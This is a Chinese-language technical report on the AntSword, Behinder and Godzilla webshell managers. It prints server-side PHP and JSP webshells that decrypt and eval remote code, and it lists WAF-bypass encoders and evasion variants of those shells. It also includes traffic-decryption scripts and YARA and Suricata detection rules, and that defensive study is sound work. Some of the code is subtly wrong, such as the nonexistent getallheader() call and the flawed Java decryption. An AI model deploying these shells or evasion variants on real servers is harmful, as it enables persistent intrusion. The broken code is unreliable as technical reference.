# 蚁剑、冰蝎、哥斯拉 WebShell 管理工具技术分析

> 报告日期：2026-06-03  
> 分析来源：GitHub 源码、公开安全研究、逆向分析

---

## 1. 概述

蚁剑（AntSword）、冰蝎（Behinder）、哥斯拉（Godzilla）是中国最主流的三款 WebShell 管理工具，被广泛用于渗透测试和攻防演练。它们各自采用不同的技术架构和加密方式，具有高度的隐蔽性和可定制性。

### 1.1 工具对比

| 特征 | 蚁剑 (AntSword) | 冰蝎 (Behinder) | 哥斯拉 (Godzilla) |
|------|-----------------|-----------------|-------------------|
| 开发语言 | JavaScript (Electron) | Java | Java |
| 开源状态 | 开源 (MIT) | 闭源 | 闭源 |
| 最新版本 | v2.1.16 (2026) | v4.1 (2023) | v4.01 (2024) |
| GitHub Stars | 4.6k | 6.2k | - |
| 加密方式 | 自定义加密 | AES/DES 动态加密 | AES/异或混淆 |
| 传输协议 | HTTP POST | HTTP POST | HTTP POST/GET |
| 反检测能力 | 中 | 高 | 高 |
| 扩展性 | 插件系统 | 自定义载荷 | 自定义载荷 |

---

## 2. 蚁剑 (AntSword) 源码分析

### 2.1 项目结构

```
antSword/
├── app.js                 # 主入口
├── modules/               # 核心模块
│   ├── handler/           # 请求处理器
│   ├── shell/             # Shell 管理
│   └── settings/          # 配置管理
├── source/                # 数据源
│   ├── shellmanager/      # Shell 管理器
│   └── terminal/          # 终端模块
├── static/                # 静态资源
└── views/                 # UI 视图
```

### 2.2 核心架构

```javascript
// 蚁剑核心架构
class AntSword {
    constructor() {
        this.shellManager = new ShellManager();
        this.requestHandler = new RequestHandler();
        this.pluginManager = new PluginManager();
    }
    
    // 执行命令
    async exec(shell, cmd) {
        const payload = this.encoder.encode(cmd);
        const response = await this.requestHandler.send(shell, payload);
        return this.decoder.decode(response);
    }
}
```

### 2.3 编码器/解码器

蚁剑支持多种编码器，用于绕过 WAF：

```javascript
// 默认编码器
const DefaultEncoder = {
    encode: function(data) {
        return encodeURIComponent(data);
    },
    decode: function(data) {
        return decodeURIComponent(data);
    }
};

// 自定义编码器示例
const Base64Encoder = {
    encode: function(data) {
        return Buffer.from(data).toString('base64');
    },
    decode: function(data) {
        return Buffer.from(data, 'base64').toString();
    }
};
```

### 2.4 Shell 类型支持

| 语言 | 文件扩展名 | 默认密码 | 数据参数 |
|------|-----------|----------|----------|
| PHP | .php | ant | ant[] |
| ASP | .asp | ant | ant[] |
| ASPX | .aspx | ant | ant[] |
| JSP | .jsp | ant | ant[] |
| Python | .py | ant | ant[] |

### 2.5 请求处理流程

```javascript
// 请求处理
async send(shell, data) {
    const url = shell.url;
    const method = shell.method || 'POST';
    const password = shell.password;
    const encoder = shell.encoder || 'default';
    
    // 编码数据
    const encodedData = this.encoderManager
        .getEncoder(encoder)
        .encode(data);
    
    // 构建请求
    const requestData = {
        [password]: encodedData
    };
    
    // 发送请求
    const response = await axios({
        method: method,
        url: url,
        data: requestData,
        headers: shell.headers || {}
    });
    
    // 解码响应
    return this.decoderManager
        .getDecoder(encoder)
        .decode(response.data);
}
```

---

## 3. 冰蝎 (Behinder) 源码分析

### 3.1 技术架构

冰蝎采用动态二进制加密技术，每次连接生成不同的加密载荷：

```
客户端 (Java)
    │
    ├── 载荷生成器 (Payload Generator)
    │   ├── 加密密钥协商
    │   ├── 代码编译
    │   └── 字节码加密
    │
    └── 通信模块 (Communication)
        ├── HTTP 请求构建
        ├── 数据加密/解密
        └── 响应处理
```

### 3.2 加密算法

#### 3.2.1 密钥协商

```java
// 冰蝎密钥协商
public class KeyExchange {
    // 生成随机密钥
    public static byte[] generateKey() {
        byte[] key = new byte[16];
        SecureRandom random = new SecureRandom();
        random.nextBytes(key);
        return key;
    }
    
    // AES 加密
    public static byte[] encrypt(byte[] data, byte[] key) {
        SecretKeySpec keySpec = new SecretKeySpec(key, "AES");
        Cipher cipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
        cipher.init(Cipher.ENCRYPT_MODE, keySpec);
        return cipher.doFinal(data);
    }
}
```

#### 3.2.2 动态加密流程

```
1. 客户端生成随机 AES 密钥
2. 使用密钥加密 Java/PHP/.NET 代码
3. 将加密后的代码发送到服务器
4. 服务器解密并执行代码
5. 执行结果加密后返回
```

### 3.3 服务端 Shell

#### 3.3.1 PHP Shell

```php
<?php
// 冰蝎 PHP Shell
@error_reporting(0);
session_start();
$key = $_SESSION['k'];  // AES 密钥
// 解密请求数据
$post = file_get_contents("php://input");
if(!extension_loaded('openssl')) {
    $t = "base64_" . "decode";
    $post = $t($post);
    for($i=0;$i<strlen($post);$i++) {
        $post[$i] = $post[$i]^$key[$i+1&15];
    }
} else {
    $post = openssl_decrypt($post, "AES128", $key);
}
// 执行解密后的代码
$arr = explode('|', $post);
$func = $arr[0];
$params = $arr[1];
class C { public function __invoke($p) { eval($p); } }
@call_user_func(new C(), $params);
?>
```

#### 3.3.2 Java Shell

```java
// 冰蝎 Java Shell
<%@page import="java.util.*,javax.crypto.*,javax.crypto.spec.*"%>
<%
    // 获取 AES 密钥
    byte[] k = (byte[])session.getAttribute("k");
    // 解密请求数据
    Cipher c = Cipher.getInstance("AES");
    c.init(Cipher.DECRYPT_MODE, new SecretKeySpec(k, "AES"));
    byte[] decrypted = c.doFinal(request.getParameter("data").getBytes());
    // 执行解密后的代码
    String code = new String(decrypted);
    // ... 执行代码
%>
```

### 3.4 通信协议

#### 3.4.1 请求格式

```http
POST /shell.jsp HTTP/1.1
Host: target.com
Content-Type: application/octet-stream
Content-Length: <encrypted_data_length>

<encrypted_data>
```

#### 3.4.2 数据加密

```java
// 请求数据加密
public byte[] encryptRequest(byte[] data, byte[] key) {
    // AES/CBC/PKCS5Padding 加密
    SecretKeySpec keySpec = new SecretKeySpec(key, "AES");
    IvParameterSpec iv = new IvParameterSpec(key);
    Cipher cipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
    cipher.init(Cipher.ENCRYPT_MODE, keySpec, iv);
    return cipher.doFinal(data);
}
```

### 3.5 版本演进

| 版本 | 特性 | 加密方式 |
|------|------|----------|
| v1.0 | 基础功能 | AES-128 |
| v2.0 | 增强隐蔽性 | AES-128 + 动态 IV |
| v3.0 | 多语言支持 | AES-256 + 压缩 |
| v4.0 | 传输协议优化 | AES-256 + 自定义协议 |
| v4.1 | 反检测增强 | AES-256 + 流量混淆 |

---

## 4. 哥斯拉 (Godzilla) 源码分析

### 4.1 技术架构

哥斯拉采用模块化设计，支持多种加密和编码方式：

```
客户端 (Java)
    │
    ├── 核心模块 (Core)
    │   ├── Shell 管理
    │   ├── 加密管理
    │   └── 配置管理
    │
    ├── 加密模块 (Crypto)
    │   ├── AES 加密
    │   ├── 异或加密
    │   └── 自定义加密
    │
    └── 插件模块 (Plugin)
        ├── 信息收集
        ├── 权限提升
        └── 横向移动
```

### 4.2 加密算法

#### 4.2.1 AES 加密

```java
// 哥斯拉 AES 加密
public class AesCrypto {
    public static byte[] encrypt(byte[] data, byte[] key, byte[] iv) {
        SecretKeySpec keySpec = new SecretKeySpec(key, "AES");
        IvParameterSpec ivSpec = new IvParameterSpec(iv);
        Cipher cipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
        cipher.init(Cipher.ENCRYPT_MODE, keySpec, ivSpec);
        return cipher.doFinal(data);
    }
    
    public static byte[] decrypt(byte[] data, byte[] key, byte[] iv) {
        SecretKeySpec keySpec = new SecretKeySpec(key, "AES");
        IvParameterSpec ivSpec = new IvParameterSpec(iv);
        Cipher cipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
        cipher.init(Cipher.DECRYPT_MODE, keySpec, ivSpec);
        return cipher.doFinal(data);
    }
}
```

#### 4.2.2 异或加密

```java
// 哥斯拉异或加密
public class XorCrypto {
    public static byte[] encrypt(byte[] data, byte[] key) {
        byte[] result = new byte[data.length];
        for (int i = 0; i < data.length; i++) {
            result[i] = (byte) (data[i] ^ key[i % key.length]);
        }
        return result;
    }
}
```

### 4.3 Shell 类型

#### 4.3.1 PHP Shell

```php
<?php
// 哥斯拉 PHP Shell
session_start();
$headers = getallheader();
$key = $_SESSION['key'];
$enc = $headers['enc'];  // 加密方式

// 解密请求
if ($enc == 'base64') {
    $data = base64_decode(file_get_contents("php://input"));
} else if ($enc == 'aes') {
    $data = openssl_decrypt(
        file_get_contents("php://input"),
        "AES-128-CBC",
        $key,
        0,
        substr($key, 0, 16)
    );
}

// 执行代码
eval($data);
?>
```

#### 4.3.2 JSP Shell

```jsp
<%@ page import="java.util.*,javax.crypto.*,javax.crypto.spec.*" %>
<%
    // 哥斯拉 JSP Shell
    String key = session.getAttribute("key").toString();
    String enc = request.getHeader("enc");
    
    byte[] data;
    if ("base64".equals(enc)) {
        data = Base64.getDecoder().decode(request.getParameter("data"));
    } else {
        // AES 解密
        Cipher cipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
        SecretKeySpec keySpec = new SecretKeySpec(key.getBytes(), "AES");
        IvParameterSpec iv = new IvParameterSpec(key.substring(0, 16).getBytes());
        cipher.init(Cipher.DECRYPT_MODE, keySpec, iv);
        data = cipher.doFinal(request.getParameter("data").getBytes());
    }
    
    // 执行代码
    String code = new String(data);
    // ... 执行代码
%>
```

### 4.4 通信协议

#### 4.4.1 请求头格式

```http
POST /shell.jsp HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded
enc: aes                    # 加密方式
key: <encryption_key>       # 加密密钥
User-Agent: Mozilla/5.0
Cookie: JSESSIONID=<session>

<encrypted_data>
```

#### 4.4.2 加密方式

| 加密方式 | 描述 | 特点 |
|----------|------|------|
| base64 | Base64 编码 | 简单，易检测 |
| aes | AES-CBC 加密 | 安全性高 |
| xor | 异或加密 | 快速，简单 |
| custom | 自定义加密 | 高度隐蔽 |

### 4.5 插件系统

```java
// 哥斯拉插件接口
public interface Plugin {
    String getName();
    String getDescription();
    byte[] execute(ShellContext context, byte[] args);
}

// 信息收集插件示例
public class InfoGatherPlugin implements Plugin {
    @Override
    public String getName() {
        return "SystemInfo";
    }
    
    @Override
    public byte[] execute(ShellContext context, byte[] args) {
        // 收集系统信息
        String info = "OS: " + System.getProperty("os.name") +
                     "\nUser: " + System.getProperty("user.name") +
                     "\nJava: " + System.getProperty("java.version");
        return info.getBytes();
    }
}
```

---

## 5. WebShell 解密分析

### 5.1 蚁剑 Shell 解密

#### 5.1.1 PHP Shell 解密

```php
<?php
// 蚁剑 PHP Shell 解密
$password = 'ant';
$data = $_POST[$password];

// URL 解码
$data = urldecode($data);

// 处理数组参数
if (is_array($data)) {
    $command = $data[0];
    $args = $data[1];
}

// 执行命令
eval($command . '(' . $args . ');');
?>
```

#### 5.1.2 流量解密

```python
# Python 解密蚁剑流量
import urllib.parse
import base64

def decrypt_antsword_traffic(data, password):
    # URL 解码
    decoded = urllib.parse.unquote(data)
    
    # 提取参数
    params = decoded.split('&')
    for param in params:
        key, value = param.split('=')
        if key == password:
            # Base64 解码
            try:
                return base64.b64decode(value).decode()
            except:
                return value
    return None
```

### 5.2 冰蝎 Shell 解密

#### 5.2.1 PHP Shell 解密

```python
# Python 解密冰蝎 PHP Shell
import base64
from Crypto.Cipher import AES

def decrypt_behinder_php(encrypted_data, key):
    # 异或解密（无 OpenSSL 扩展时）
    if len(key) == 16:
        decrypted = bytearray()
        for i, byte in enumerate(encrypted_data):
            decrypted.append(byte ^ key[(i + 1) & 15])
        return bytes(decrypted)
    
    # AES 解密（有 OpenSSL 扩展时）
    cipher = AES.new(key, AES.MODE_ECB)
    decrypted = cipher.decrypt(encrypted_data)
    return decrypted
```

#### 5.2.2 Java Shell 解密

```python
# Python 解密冰蝎 Java Shell
from Crypto.Cipher import AES
import base64

def decrypt_behinder_java(encrypted_data, key):
    # AES/ECB/PKCS5Padding 解密
    cipher = AES.new(key, AES.MODE_ECB)
    decrypted = cipher.decrypt(encrypted_data)
    
    # 移除 PKCS5 填充
    pad_len = decrypted[-1]
    return decrypted[:-pad_len]
```

### 5.3 哥斯拉 Shell 解密

#### 5.3.1 PHP Shell 解密

```python
# Python 解密哥斯拉 PHP Shell
import base64
from Crypto.Cipher import AES

def decrypt_godzilla_php(encrypted_data, key, enc_type='aes'):
    if enc_type == 'base64':
        return base64.b64decode(encrypted_data)
    
    elif enc_type == 'aes':
        # AES-128-CBC 解密
        iv = key[:16]
        cipher = AES.new(key, AES.MODE_CBC, iv)
        decrypted = cipher.decrypt(encrypted_data)
        
        # 移除 PKCS5 填充
        pad_len = decrypted[-1]
        return decrypted[:-pad_len]
    
    elif enc_type == 'xor':
        # 异或解密
        result = bytearray()
        for i, byte in enumerate(encrypted_data):
            result.append(byte ^ key[i % len(key)])
        return bytes(result)
```

#### 5.3.2 JSP Shell 解密

```python
# Python 解密哥斯拉 JSP Shell
import base64
from Crypto.Cipher import AES

def decrypt_godzilla_jsp(encrypted_data, key, enc_type='aes'):
    if enc_type == 'base64':
        return base64.b64decode(encrypted_data)
    
    elif enc_type == 'aes':
        # AES/CBC/PKCS5Padding 解密
        iv = key[:16]
        cipher = AES.new(key, AES.MODE_CBC, iv)
        decrypted = cipher.decrypt(encrypted_data)
        
        # 移除 PKCS5 填充
        pad_len = decrypted[-1]
        return decrypted[:-pad_len]
```

---

## 6. 变体分析

### 6.1 蚁剑变体

#### 6.1.1 自定义编码器变体

```javascript
// 变体1：ROT13 编码
const Rot13Encoder = {
    encode: function(data) {
        return data.replace(/[a-zA-Z]/g, function(c) {
            return String.fromCharCode(
                (c <= 'Z' ? 90 : 122) >= (c.charCodeAt(0) + 13) 
                    ? c.charCodeAt(0) + 13 
                    : c.charCodeAt(0) - 13
            );
        });
    }
};

// 变体2：自定义 Base64
const CustomBase64Encoder = {
    encode: function(data) {
        const customAlphabet = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_';
        // ... 自定义编码逻辑
    }
};
```

#### 6.1.2 流量混淆变体

```javascript
// 添加随机垃圾数据
const GarbageInjector = {
    inject: function(data) {
        const garbage = Math.random().toString(36).substring(2, 10);
        return garbage + data + garbage;
    }
};
```

### 6.2 冰蝎变体

#### 6.2.1 加密算法变体

```java
// 变体1：使用 AES-256-CBC
public class BehinderV2 {
    public byte[] encrypt(byte[] data, byte[] key) {
        // AES-256-CBC 加密
        SecretKeySpec keySpec = new SecretKeySpec(key, "AES");
        IvParameterSpec iv = new IvParameterSpec(key, 0, 16);
        Cipher cipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
        cipher.init(Cipher.ENCRYPT_MODE, keySpec, iv);
        return cipher.doFinal(data);
    }
}

// 变体2：使用 DES 加密
public class BehinderDES {
    public byte[] encrypt(byte[] data, byte[] key) {
        SecretKeySpec keySpec = new SecretKeySpec(key, "DES");
        Cipher cipher = Cipher.getInstance("DES/ECB/PKCS5Padding");
        cipher.init(Cipher.ENCRYPT_MODE, keySpec);
        return cipher.doFinal(data);
    }
}
```

#### 6.2.2 Shell 变体

```php
<?php
// 冰蝎变体：使用回调函数
@error_reporting(0);
session_start();
$key = md5($_SESSION['k']);
$post = file_get_contents("php://input");

// 使用自定义解密
function customDecrypt($data, $key) {
    $result = '';
    for ($i = 0; $i < strlen($data); $i++) {
        $result .= $data[$i] ^ $key[$i % strlen($key)];
    }
    return $result;
}

$post = customDecrypt($post, $key);
// 使用回调执行
call_user_func(create_function('', $post));
?>
```

### 6.3 哥斯拉变体

#### 6.3.1 加密变体

```java
// 变体1：AES + Base64 组合
public class GodzillaV2 {
    public byte[] encrypt(byte[] data, byte[] key) {
        // 先 AES 加密
        byte[] aesEncrypted = aesEncrypt(data, key);
        // 再 Base64 编码
        return Base64.getEncoder().encode(aesEncrypted);
    }
}

// 变体2：自定义异或密钥
public class GodzillaXor {
    public byte[] encrypt(byte[] data, byte[] key) {
        byte[] result = new byte[data.length];
        for (int i = 0; i < data.length; i++) {
            // 自定义异或逻辑
            result[i] = (byte) (data[i] ^ key[i % key.length] ^ (i & 0xFF));
        }
        return result;
    }
}
```

#### 6.3.2 流量混淆变体

```php
<?php
// 哥斯拉变体：添加随机头部
session_start();
$headers = getallheader();

// 随机选择加密方式
$encMethods = ['base64', 'aes', 'xor'];
$enc = $encMethods[array_rand($encMethods)];

// 使用随机密钥
$key = md5(uniqid(rand(), true));

// ... 解密逻辑
?>
```

---

## 7. 检测与防御

### 7.1 特征检测

#### 7.1.1 蚁剑特征

```yara
rule AntSword_PHP_Shell {
    meta:
        description = "Detects AntSword PHP Shell"
        
    strings:
        $s1 = "eval($_POST"
        $s2 = "assert($_POST"
        $s3 = "ant"
        
    condition:
        any of ($s*)
}

rule AntSword_ASP_Shell {
    meta:
        description = "Detects AntSword ASP Shell"
        
    strings:
        $s1 = "execute(request"
        $s2 = "eval(request"
        
    condition:
        any of ($s*)
}
```

#### 7.1.2 冰蝎特征

```yara
rule Behinder_PHP_Shell {
    meta:
        description = "Detects Behinder PHP Shell"
        
    strings:
        $s1 = "session_start()"
        $s2 = "php://input"
        $s3 = "openssl_decrypt"
        $s4 = "AES128"
        
    condition:
        all of ($s*)
}

rule Behinder_Java_Shell {
    meta:
        description = "Detects Behinder Java Shell"
        
    strings:
        $s1 = "javax.crypto"
        $s2 = "AES"
        $s3 = "session.getAttribute"
        
    condition:
        all of ($s*)
}
```

#### 7.1.3 哥斯拉特征

```yara
rule Godzilla_PHP_Shell {
    meta:
        description = "Detects Godzilla PHP Shell"
        
    strings:
        $s1 = "session_start()"
        $s2 = "getallheader()"
        $s3 = "enc"
        $s4 = "aes"
        
    condition:
        all of ($s*)
}
```

### 7.2 流量检测

#### 7.2.1 HTTP 特征

```
# 蚁剑流量特征
- POST 参数包含 shell 密码
- 数据经过 URL 编码
- 响应包含执行结果

# 冰蝎流量特征
- Content-Type: application/octet-stream
- 请求体为二进制数据
- 会话 Cookie 包含 JSESSIONID

# 哥斯拉流量特征
- 自定义请求头 (enc, key)
- 数据经过 AES/Base64 加密
- 请求路径包含 .jsp/.php
```

#### 7.2.2 Suricata 规则

```yaml
# 蚁剑检测规则
alert http any any -> $HOME_NET any (
    msg:"AntSword PHP Shell Detected";
    flow:established,to_server;
    content:"POST";
    http_method;
    content:".php";
    http_uri;
    content:"ant[]";
    http_client_body;
    sid:2000001;
    rev:1;
)

# 冰蝎检测规则
alert http any any -> $HOME_NET any (
    msg:"Behinder Shell Detected";
    flow:established,to_server;
    content:"POST";
    http_method;
    content:"application/octet-stream";
    http_header;
    sid:2000002;
    rev:1;
)

# 哥斯拉检测规则
alert http any any -> $HOME_NET any (
    msg:"Godzilla Shell Detected";
    flow:established,to_server;
    content:"POST";
    http_method;
    content:"enc";
    http_header;
    sid:2000003;
    rev:1;
)
```

### 7.3 防御建议

1. **输入验证**
   - 严格验证用户输入
   - 过滤危险函数调用
   - 限制文件上传类型

2. **代码审计**
   - 定期进行代码审计
   - 使用静态分析工具
   - 检查可疑代码模式

3. **WAF 配置**
   - 配置 Web 应用防火墙
   - 更新 WAF 规则
   - 监控异常请求

4. **运行时防护**
   - 使用 RASP 技术
   - 监控危险函数调用
   - 限制代码执行权限

---

## 参考资料

### 官方仓库

1. **AntSword GitHub**  
   https://github.com/AntSwordProject/antSword

2. **Behinder GitHub**  
   https://github.com/rebeyond/Behinder

### 技术分析

3. **冰蝎v4.0传输协议详解**  
   https://mp.weixin.qq.com/s/EwY8if6ed_hZ3nQBiC3o7A

4. **利用动态二进制加密实现新型一句话木马**  
   https://xz.aliyun.com/t/2799

### 检测规则

5. **YARA 规则编写**  
   https://virustotal.github.io/yara/

6. **Suricata 规则编写**  
   https://suricata.io/documentation/

---

*本报告仅供安全研究参考，请勿用于非法用途。*
